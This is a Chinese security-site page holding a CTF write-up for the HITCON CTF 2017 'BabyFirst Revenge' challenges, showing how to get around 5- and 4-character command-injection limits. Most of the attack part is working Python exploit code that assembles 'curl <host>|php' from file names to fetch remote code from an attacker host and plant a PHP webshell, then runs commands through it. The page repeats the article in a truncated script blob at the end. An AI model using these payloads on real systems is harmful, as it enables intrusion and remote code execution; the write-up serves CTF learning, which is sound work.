<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit"/>
<meta name="force-rendering" content="webkit"/>
<meta name="referrer" content="always" />
<meta name="description" content="安全客 - 安全资讯平台" />
<link rel="icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon" />
<link rel="shortcut icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon" />
<meta name="keywords"
    content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议" />

  <title>【CTF 攻略】如何绕过四个字符限制getshell-安全客 - 安全资讯平台</title>
  <meta name="description" content="安全客 - 安全资讯平台" />
  <meta name="keywords"
    content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议" />
  <script>(function(window){
        

function empty() {}

empty();
      })(this);</script>

<link rel="stylesheet" href="https://s1.ssl.qhimg.com/static/d4cec9cd8efbfd10.css">
<link rel="stylesheet" href="https://s1.ssl.qhimg.com/static/a51843d6b82241be,d94674bd62441768,56ce5cef8079a575,8514be0a921ca6e8,4802c0c382205144,8e4464e423fe6849,13c0bf3b0c2e4882,2b3936345af879da,f568b72da28701d3,da046392ff3eccb9,aa4b116b0af3b8cd,e0bfaead3067bbc1,fea7be2aa27ff2f2,d9201f9584eef2b6,fd21c2ec74567dad,b7a96d5b0251b853,5dcd3ae257726a93,1c6ca2a1950ce544,0faa71bef217b8bc,a36a201f0d041a4e,7344734df279a41a,edd5eea8fdbfac69,5f39838e3d3adabf,639096234333f66b,7315fe23da834588,e8c1651c2e73e657,05bbb034f84fe2cd,4c4133809419f2be,14794e88015634b7,a165d020d16c358a,315ee55058416496.css">
<script>window._dynamic_deps_={}</script>
</head>

<body>
  <div id='app'><!--[--><div class="_9" style="height:60px;"><div class="g-w"><a class="logo1" href="https://www.anquanke.com/"></a><div class="_10"><!--[--><div class="item"><div style="cursor:pointer;"><span>首页</span><ul><!--[--><!--]--></ul></div></div><div class="item"><div style=""><span>阅读</span><ul><!--[--><li class="sub-item"><a href="https://www.anquanke.com/news">安全资讯</a></li><li class="sub-item"><a href="https://www.anquanke.com/knowledge">安全知识</a></li><li class="sub-item"><a href="https://www.anquanke.com/tool">安全工具</a></li><!--]--></ul></div></div><div class="item"><div style="cursor:pointer;"><span>活动</span><ul><!--[--><!--]--></ul></div></div><div class="item"><div style="cursor:pointer;"><span>招聘</span><ul><!--[--><!--]--></ul></div></div><div class="item"><div style="cursor:pointer;"><span>安全导航</span><ul><!--[--><!--]--></ul></div></div><div class="item"><div style="cursor:pointer;"><span>内容精选</span><ul><!--[--><li class="sub-item"><a href="https://www.anquanke.com/column/index.html">专栏</a></li><li class="sub-item"><a href="https://www.anquanke.com/subject-list">精选专题</a></li><li class="sub-item"><a href="https://www.anquanke.com/discovery">安全客季刊</a></li><li class="sub-item"><a href="https://www.anquanke.com/week-list">360网络安全周报</a></li><!--]--></ul></div></div><!--]--></div><!----></div></div><div class="index"><div class="index-main"><div class="_55"><h1>【CTF 攻略】如何绕过四个字符限制getshell</h1><div class="read"><p><span class="read-text">阅读量</span><b class="read-num">429796</b></p><!----><p><span class="read-sep">|</span><img class="read-fee" src="https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png"></p></div><p class="publish">发布时间 : 2017-11-10 10:05:57</p><div class="_54" style="display:none;"><b class="close">x</b><h5>译文声明</h5><p> 本文是翻译文章<!----><span>，文章来源：安全客</span></p><!----><p>译文仅供参考，具体内容表达以及含义原文为准。</p></div><div class="content" id="js-article"><html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
<body>
<p style="text-align: center"><span><img title="t01c096db530403a5fe.png" alt="http://p5.qhimg.com/t01c096db530403a5fe.png" data-original="https://p4.ssl.qhimg.com/t011ba710533fd2bda6.png"></span></p>
<p><span>作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2614799936" target="_self"><span>qqwe_01</span></a></p>
<p><span>预估稿费：400RMB</span></p>
<p><span>投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p>
<p><span><br></span></p>
<p><span style="font-size: 18px"><strong><span>前言</span></strong></span></p>
<p><span>本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。</span></p>
<p></p>
<p><span style="font-size: 18px"><strong><span>热身</span></strong></span></p>
<p><span>问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：</span></p>
<p><span></span></p>
<pre><code>BabyFirst Revenge
&lt;?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);</code></pre>
<p><span></span></p>
<p><span style="font-size: 18px"><strong><span>冷静分析</span></strong></span></p>
<p><span>目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。</span></p>
<p><span>我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。</span></p>
<p><span>在此之前，先做些知识铺垫。</span></p>
<p><span><strong style="font-size: 18px"><span>IP的等价表示法</span></strong></span></p>
<p><span>IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是</span><span>相同的。</span></p>
<p style="text-align: center"><img title="t010d3f8d798c157344.png" alt="http://p0.qhimg.com/t010d3f8d798c157344.png" data-original="https://p5.ssl.qhimg.com/t010e7a86cdf1618e75.png"></p>
<p><span>它们之间的转换也很方便：</span></p>
<p><span></span></p>
<pre><code>ip = '127.0.0.1'
# 十六进制
print '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                   for i in ip.split('.')])
# 长整数
print int(''.join([str(hex(int(i))[2:].zfill(2))
                   for i in ip.split('.')]), 16)
# 八进制
print '0' + oct(int(''.join([str(hex(int(i))[2:].zfill(2))
                   for i in ip.split('.')]), 16))</code></pre>
<p><span><strong style="font-size: 18px"><span>从网络下载文件</span></strong></span></p>
<p style="text-align: center;text-indent: 0em"><img title="t0157d1effe6f6077bf.png" alt="http://p0.qhimg.com/t0157d1effe6f6077bf.png" data-original="https://p2.ssl.qhimg.com/t0179a43f9481b4fbc6.png"></p>
<p><span><strong><span>利用续行符拆分命令成多行</span></strong></span></p>
<p style="text-align: center"><img title="t01745a941a746a7ac0.png" alt="http://p5.qhimg.com/t01745a941a746a7ac0.png" data-original="https://p0.ssl.qhimg.com/t01d2eac72941e42be9.png"></p>
<p><span><strong><span>用两个字符在Linux下创建文件</span></strong></span></p>
<p style="text-align: center"><img title="t01485c8bfc8fbf987f.png" alt="http://p5.qhimg.com/t01485c8bfc8fbf987f.png" data-original="https://p2.ssl.qhimg.com/t019808b722225de73d.png"></p>
<p><span><strong><span>将命令执行结果重定向到文件</span></strong></span></p>
<p style="text-align: center"><img title="t01e45c7a16d86c4e2c.png" alt="http://p9.qhimg.com/t01e45c7a16d86c4e2c.png" data-original="https://p0.ssl.qhimg.com/t012de068258a2e3d04.png"></p>
<p><span><strong><span>利用重定向向文件追加内容</span></strong></span></p>
<p style="text-align: center"><img title="t0125c23ce2f3d45621.png" alt="http://p2.qhimg.com/t0125c23ce2f3d45621.png" data-original="https://p4.ssl.qhimg.com/t015f5da0f73df752b7.png"></p>
<p><span><strong><span>删除文件</span></strong></span></p>
<p style="text-align: center"><img title="t01e267cc27d6277631.png" alt="http://p4.qhimg.com/t01e267cc27d6277631.png" data-original="https://p1.ssl.qhimg.com/t0121856133157c3f34.png"></p>
<p><span><strong><span>ls 的文件排列顺序</span></strong></span></p>
<p><span>一句alphabetical耐人寻味，不过大致顺序就是如下图所示。</span></p>
<p style="text-align: center"><img title="t01e104d2e591a66fcd.png" alt="http://p7.qhimg.com/t01e104d2e591a66fcd.png" data-original="https://p3.ssl.qhimg.com/t01c4dd700d11f91860.png"></p>
<p><span style="font-size: 18px"><strong><span><br></span></strong></span></p>
<p><span style="font-size: 18px"><strong><span>开始表演</span></strong></span></p>
<p><span>假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip &gt; A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。</span></p>
<p style="text-align: center"><img title="t0106f100f423201580.png" alt="http://p8.qhimg.com/t0106f100f423201580.png" data-original="https://p2.ssl.qhimg.com/t016294d3a767429eab.png"></p>
<p><span>这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。</span></p>
<p><span>另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。</span></p>
<p><span>接下来让我们完成最后30%的工作，写个exp。</span></p>
<p><span></span></p>
<pre><code># -*- coding:utf8 -*-
import requests as r
import hashlib
url = 'http://52.199.204.34/'
# 查询自己的IP
ip = r.get('http://ipv4.icanhazip.com/').text.strip()
sandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/'
 
reset = url + '?reset'
cmd = url + '?cmd='
build = ['&gt;cur\',
         '&gt;l \',
         'ls&gt;A',
         'rm c*',
         'rm l*',
         '&gt;105\',
         '&gt;304\',
         '&gt;301\',
         '&gt;9&gt;\',
         'ls&gt;&gt;A',
         'sh A',
         'php A'
         ]
# 如果目标服务器有GET，这个也是可以打的
# build = ['&gt;GE\',
#          '&gt;T\ \',
#          'ls&gt;A',
#          'rm G*',
#          'rm T*',
#          '&gt;105\',
#          '&gt;304\',
#          '&gt;301\',
#          '&gt;9&gt;\',
#          'ls&gt;&gt;A']
r.get(reset)
for i in build:
    s = r.get(cmd + i)
    print '[%s]' % s.status_code, s.url
 
s = r.get(sandbox + 'fun.php?cmd=uname -a')
print 'n' + '[%s]' % s.status_code, s.url
print s.text</code></pre>
<p><span>运行效果</span></p>
<p style="text-align: center"><img title="t013370047191f9904f.png" alt="http://p1.qhimg.com/t013370047191f9904f.png" data-original="https://p0.ssl.qhimg.com/t014cfd9d61e5c45b44.png"></p>
<p><span style="font-size: 18px"><strong><span><br></span></strong></span></p>
<p><span style="font-size: 18px"><strong><span>挑战升级</span></strong></span></p>

<p><span>这篇文章有趣的地方才刚刚开始。</span></p>
<p><span>代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。</span></p>
<p><span>BabyFirst Revenge v2：</span></p>
<p><span></span></p>
<pre><code>&lt;?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR'])
 
    @mkdir($sandbox)
    @chdir($sandbox)
    if (isset($_GET['cmd']) &amp; &amp; strlen($_GET['cmd']) &lt;= 4) {
        @exec($_GET['cmd'])
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox)
    }
    highlight_file(__FILE__)</code></pre>
<p><span></span></p>
<p><span style="font-size: 18px"><strong><span>热烈分析</span></strong></span></p>
<p><span>只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。</span></p>
<p><span>突破之旅从神奇的星号 * 开始。</span></p>
<p style="text-align: center"><img title="t011d2b1095c9235710.png" alt="http://p1.qhimg.com/t011d2b1095c9235710.png" data-original="https://p4.ssl.qhimg.com/t01c68ec189f2c38155.png"></p>
<p><span>经过简单测试我们猜测 * 的作用相当于 `ls` 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。</span></p>
<p style="text-align: center"><img title="t016acaa6a8c9c4497c.png" alt="http://p1.qhimg.com/t016acaa6a8c9c4497c.png" data-original="https://p3.ssl.qhimg.com/t01fbeb47c643a3f4fd.png"></p>
<p><span>还有本质上一样但现象很有趣的，待会儿会用到：</span></p>
<p style="text-align: center"><img title="t015afceef8c0976153.png" alt="http://p7.qhimg.com/t015afceef8c0976153.png" data-original="https://p4.ssl.qhimg.com/t01cdd7b9abeb575d5f.png"></p>
<p><span>虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。</span></p>
<p><span>写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t &gt; f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。</span></p>
<p><span>在开始操作前，再介绍两个会用到的命令：dir 和 rev。</span></p>
<p><span style="font-size: 18px"><strong><span><br></span></strong></span></p>
<p><span style="font-size: 18px"><strong><span>dir</span></strong></span></p>
<p><span>在GNU</span><span>文档中有下图这样的描述：</span></p>
<p style="text-align: center"><img title="t014c12aa56fd9386f9.png" alt="http://p1.qhimg.com/t014c12aa56fd9386f9.png" data-original="https://p0.ssl.qhimg.com/t01406e4dcc8e6ff0f7.png"></p>
<p><span>虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</span></p>
<p></p>
<p><span style="font-size: 18px"><strong><span>rev</span></strong></span></p>
<p><span>这个前面出场过，可以反转文件每一行的内容。</span></p>
<p style="text-align: center"><img title="t01184834f69bddb51a.png" alt="http://p8.qhimg.com/t01184834f69bddb51a.png" data-original="https://p5.ssl.qhimg.com/t010c4a372f495ce020.png"></p>
<p><span>实验一下：</span></p>
<p style="text-align: center"><img title="t0192fac539940680bc.png" alt="http://p2.qhimg.com/t0192fac539940680bc.png" data-original="https://p2.ssl.qhimg.com/t016a0cf34a18724b08.png"></p>
<p></p>
<p><span style="font-size: 18px"><strong><span>开始挑战</span></strong></span></p>
<p><span>需要知道的命令和 tips 都已经介绍了，下面是代码和解释：</span></p>
<p><span></span></p>
<pre><code>#-*-coding:utf8-*-
import requests as r
from time import sleep
import random
import hashlib
target = 'http://52.197.41.31/'
 
# 存放待下载文件的公网主机的IP
shell_ip = 'xx.xx.xx.xx'
 
# 本机IP
your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()
 
# 将shell_IP转换成十六进制
ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                     for i in shell_ip.split('.')])
 
reset = target + '?reset'
cmd = target + '?cmd='
sandbox = target + 'sandbox/' + 
    hashlib.md5('orange' + your_ip).hexdigest() + '/'
 
# payload某些位置的可选字符
pos0 = random.choice('efgh')
pos1 = random.choice('hkpq')
pos2 = 'g'  # 随意选择字符
 
payload = [
    '&gt;dir',
    # 创建名为 dir 的文件
 
    '&gt;%s&gt;' % pos0,
    # 假设pos0选择 f , 创建名为 f&gt; 的文件
 
    '&gt;%st-' % pos1,
    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
    # 因为alphabetical序中t&gt;s
 
    '&gt;sl',
    # 创建名为 &gt;sl 的文件；到此处有四个文件，
    # ls 的结果会是：dir f&gt; kt- sl
 
    '*&gt;v',
    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，
    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl
    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
 
    '&gt;rev',
    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v
 
    '*v&gt;%s' % pos2,
    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f
 
    # 续行分割 curl 0x11223344|php 并逆序写入
    '&gt;p',
    '&gt;ph\',
    '&gt;|\',
    '&gt;%s\' % ip[8:10],
    '&gt;%s\' % ip[6:8],
    '&gt;%s\' % ip[4:6],
    '&gt;%s\' % ip[2:4],
    '&gt;%s\' % ip[0:2],
    '&gt; \',
    '&gt;rl\',
    '&gt;cu\',
 
    'sh ' + pos2,
    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，
    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行
    'sh ' + pos0,
    # sh f 执行curl命令，下载文件，写入木马。
]
 
s = r.get(reset)
for i in payload:
    assert len(i) &lt;= 4
    s = r.get(cmd + i)
    print '[%d]' % s.status_code, s.url
    sleep(0.1)
s = r.get(sandbox + 'fun.php?cmd=uname -a')
print '[%d]' % s.status_code, s.url
print s.text</code></pre>
<p><span>运行效果：</span></p>
<p style="text-align: center"><img title="t01b1145c403a84ced2.png" alt="http://p8.qhimg.com/t01b1145c403a84ced2.png" data-original="https://p2.ssl.qhimg.com/t01d42702502e8f186e.png"></p>
<p><span style="font-size: 18px"><strong><span><br></span></strong></span></p>
<p><span style="font-size: 18px"><strong><span>后记</span></strong></span></p>
<p><span>我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的<a href="http://t.cn/RlNVPfp" target="_self">官方解答区</a></span><span>，还可以学习下Phithon师傅的《<a href="http://t.cn/RlNcllC" target="_self">小密圈里的那些奇技淫巧</a>》</span><span> 中与本文主题相关的部分。</span></p>
<p><span>最后，如果关于文章内容有任何建议或疑惑，你可以在</span><a href="https://findneo.github.io/"><span>https://findneo.github.io/</span></a> 联系<span>本文作者。感谢阅读o/</span></p>
</body>
</html></div><div class="_53" style="display:none;"> 本文翻译自安全客 <a href="" target="_blank">原文链接</a>。如若转载请注明出处。 </div><div class="_206" style="display:none;"> 商务合作，文章发布请联系 anquanke@360.cn </div><div class="_59" style=""><p> 本文由<b>qqwe_01</b>原创发布 </p><p> 转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank">转载声明</a>，注明出处： <a href="87203.html" target="_blank">https://www.anquanke.com/post/id/87203</a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_62" style="display:none;"><p> 本文转载自: <a href="">安全客</a></p><p> 如若转载,请注明出处： <a href="" target="_blank"></a></p><p>安全客 - 有思想的安全新媒体</p></div><div class="_63 share1"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" style="display:none;"></div></div><ul class="_65"><!--[--><li><a target="_blank" href="https://www.anquanke.com/tag/CTF%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5">CTF通关攻略</a></li><!--]--></ul><div class="_56"><div class="line line1"><div class="_18 item1"><b style="display:none;">+1</b><i class="iconfont icon-rate"></i><span class="rate-text">10赞</span></div><div class="_12 item1"><i class=""></i><span>收藏</span></div></div><div class="line line2"><div class="user"><img class="avatar" src="https://p5.ssl.qhmsg.com/dm/200_200_100/t01793924aa4af5c1a5.jpg"><span class="name">qqwe_01</span><span class="label- label"></span></div><div class="_63 share2"><div class="main-w"><div class="bg"></div><div class="main"><span>分享到：</span><img class="icon" data-cmd="weixin" alt="微信" src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"></div></div><div class="qrcode" style="display:none;"></div></div></div></div></div><div class="_60"><!----><!----></div><div class="_7 index-comment"><h2 class="g-title">发表评论</h2><div class="login"><p class="login-text">您还未登录，请先登录。</p><p class="login-bar"><a href="https://www.anquanke.com/login/index.html">登录</a></p></div><!----><!----><!----></div></div><div class="index-side"><div class="index-side-top"><div class="_66"><img class="banner" src="https://p0.ssl.qhimg.com/t014757b72460d855bf.png"><div class="w"><a class="avatar" href="https://www.anquanke.com/member.html?memberId=123875"><img src="https://p5.ssl.qhmsg.com/dm/200_200_100/t01793924aa4af5c1a5.jpg"></a><p class="info"><a href="https://www.anquanke.com/member.html?memberId=123875" class="name">qqwe_01</a><a href="https://www.anquanke.com/member.html?memberId=123875" class="user-label- user-label"></a></p><p class="hint">这个人太懒了，签名都懒得写一个</p><div class="bottom"><ul class="bottom-1"><li>文章</li><li><strong>3</strong></li></ul><ul class="bottom-2"><li>粉丝</li><li><strong>1</strong></li></ul><div class="spacer"></div><!----></div></div></div><div class="_64"><h3 class="title"> TA的文章</h3><ul><!--[--><li><h5><a href="87203.html">【CTF 攻略】如何绕过四个字符限制getshell</a></h5><p>2017-11-10 10:05:57</p></li><li><h5><a href="https://www.anquanke.com/post/id/86330">【技术分享】基于误植域名的水坑攻击实践</a></h5><p>2017-06-26 17:53:38</p></li><li><h5><a href="https://www.anquanke.com/post/id/85792">【国际资讯】震惊！网络犯罪成本竟然如此之低？发起DDOS攻击仅要50刀？</a></h5><p>2017-03-27 13:11:07</p></li><!--]--></ul></div><div class="_61"><h3 class="title"> 相关文章</h3><ul><!--[--><li><h5><a href="https://www.anquanke.com/post/id/89855">Shanghai-DCTF-2017 线下攻防Pwn题</a></h5><p>2017-12-08 18:12:56</p></li><li><h5><a href="https://www.anquanke.com/post/id/87307">【CTF攻略】hitcon2017之ghost in the heap writeup</a></h5><p>2017-11-24 13:56:08</p></li><li><h5><a href="https://www.anquanke.com/post/id/87206">【CTF 攻略】第三届上海市大学生网络安全大赛Writeup</a></h5><p>2017-11-10 10:54:26</p></li><li><h5><a href="https://www.anquanke.com/post/id/87191">【CTF 攻略】极棒GeekPwn工控CTF Writeup</a></h5><p>2017-11-08 18:27:59</p></li><li><h5><a href="https://www.anquanke.com/post/id/86987">【CTF 攻略】DerbyCon 2017 CTF Write Up</a></h5><p>2017-10-11 10:46:18</p></li><li><h5><a href="https://www.anquanke.com/post/id/86984">【CTF 攻略】CTF线下防御战 — 让你的靶机变成“铜墙铁壁”</a></h5><p>2017-10-10 19:38:53</p></li><li><h5><a href="https://www.anquanke.com/post/id/86847">【CTF 攻略】ISC2017 DEFCON GROUP 解救Cookie Write-Up</a></h5><p>2017-09-14 18:21:09</p></li><!--]--></ul></div><div class="_52"><h3 class="title">热门推荐</h3><ul><!--[--><!--]--></ul></div></div><div class="_57"><div class="wrap" style=""><div class="title">文章目录</div><ul class="list"><!--[--><li class="item"><a target="_self" class="on g-line1"></a><ul><!--[--><!--]--></ul></li><!--]--></ul></div></div></div></div><div class="_8"><div class="g-w main"><div class="col1"><p class="col1-logo"><img src="https://p2.ssl.qhimg.com/t018717b31ed82fff86.png"></p><div class="col1-link"><b class="col1-weixin"></b><a href="https://weibo.com/360adlab" class="col1-sina"></a><a href="https://zhuanlan.zhihu.com/c_118578260" class="col1-zhi"></a></div></div><div class="col2"><div class="title">安全客</div><ul class="col2-list"><li><a href="https://www.anquanke.com/about" rel="noopener noreferrer" target="_blank">关于我们</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a></li><li><a href="https://www.anquanke.com/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a></li></ul></div><div class="col3"><div class="title">商务合作</div><ul class="col3-list"><li><a href="https://www.anquanke.com/note/business" target="_blank" rel="noopener noreferrer">合作内容</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a></li><li><a href="https://www.anquanke.com/link" target="_blank" rel="noopener noreferrer">友情链接</a></li></ul></div><div class="col4"><div class="title">内容需知</div><ul><li><a href="https://www.anquanke.com/contribute/tips" target="_blank" rel="noopener noreferrer">投稿须知</a></li><li><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a></li><li>官网QQ群8：819797106</li><li>官网QQ群3：830462644(已满)</li><li>官网QQ群2：814450983(已满)</li><li>官网QQ群1：702511263(已满)</li></ul></div><div class="col5"><div class="title">合作单位</div><ul><li><a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="https://p0.ssl.qhimg.com/t01592a959354157bc0.png" style="max-height:40px;"></a></li><li style="margin-top:-20px;"><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="https://p0.ssl.qhimg.com/t014f76fcea94035e47.png" style="max-height:50px;margin-top:10px;"></a></li></ul></div></div><div class="right g-w"><span>Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved </span><a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a><span id="cnzz_stat_icon_1271278035"><a href="https://www.cnzz.com/stat/website.php?web_id=1271278035" target="_blank" title="站长统计"><img border="0" hspace="0" vspace="0" src="https://icon.cnzz.com/img/pic.gif"></a></span></div><div class="layer" style="display:none;"><div class="layer-main"><div class="layer-title">微信二维码</div><b class="layer-close">X</b><img src="https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg" alt="安全客"></div></div></div><!--]--></div><script>window.__state__={"artical":{"post":{"id":87203,"title":"【CTF 攻略】如何绕过四个字符限制getshell","category_name":"安全知识","category_slug":"knowledge","desc":"本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。","date":"2017-11-10 10:05:57","time_interval":"2017-11-10","status":"publish","comment":0,"cover":"https://p2.ssl.qhimg.com/t011ba710533fd2bda6.png","subject":false,"red":false,"type":"origin","url":"","source":"安全客","fee":"400","origin_author":"","pv":429796,"like_count":10,"liked":0,"tags":["CTF通关攻略"],"is_favorite":false,"favorite_count":11,"content":"<html>\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head>\n<body>\n<p style=\"text-align: center\"><span><img title=\"t01c096db530403a5fe.png\" alt=\"http://p5.qhimg.com/t01c096db530403a5fe.png\" data-original=\"https://p4.ssl.qhimg.com/t011ba710533fd2bda6.png\"></span></p>\n<p><span>作者：</span><a href=\"http://bobao.360.cn/member/contribute?uid=2614799936\" target=\"_self\"><span>qqwe_01</span></a></p>\n<p><span>预估稿费：400RMB</span></p>\n<p><span>投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p>\n<p><span><br></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>前言</span></strong></span></p>\n<p><span>本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。</span></p>\n<p></p>\n<p><span style=\"font-size: 18px\"><strong><span>热身</span></strong></span></p>\n<p><span>问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：</span></p>\n<p><span></span></p>\n<pre><code>BabyFirst Revenge\n&lt;?php\n    $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) {\n        @exec($_GET['cmd']);\n    } else if (isset($_GET['reset'])) {\n        @exec('/bin/rm -rf ' . $sandbox);\n    }\n    highlight_file(__FILE__);</code></pre>\n<p><span></span></p>\n<p><span style=\"font-size: 18px\"><strong><span>冷静分析</span></strong></span></p>\n<p><span>目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。</span></p>\n<p><span>我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。</span></p>\n<p><span>在此之前，先做些知识铺垫。</span></p>\n<p><span><strong style=\"font-size: 18px\"><span>IP的等价表示法</span></strong></span></p>\n<p><span>IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是</span><span>相同的。</span></p>\n<p style=\"text-align: center\"><img title=\"t010d3f8d798c157344.png\" alt=\"http://p0.qhimg.com/t010d3f8d798c157344.png\" data-original=\"https://p5.ssl.qhimg.com/t010e7a86cdf1618e75.png\"></p>\n<p><span>它们之间的转换也很方便：</span></p>\n<p><span></span></p>\n<pre><code>ip = '127.0.0.1'\n# 十六进制\nprint '0x' + ''.join([str(hex(int(i))[2:].zfill(2))\n                   for i in ip.split('.')])\n# 长整数\nprint int(''.join([str(hex(int(i))[2:].zfill(2))\n                   for i in ip.split('.')]), 16)\n# 八进制\nprint '0' + oct(int(''.join([str(hex(int(i))[2:].zfill(2))\n                   for i in ip.split('.')]), 16))</code></pre>\n<p><span><strong style=\"font-size: 18px\"><span>从网络下载文件</span></strong></span></p>\n<p style=\"text-align: center;text-indent: 0em\"><img title=\"t0157d1effe6f6077bf.png\" alt=\"http://p0.qhimg.com/t0157d1effe6f6077bf.png\" 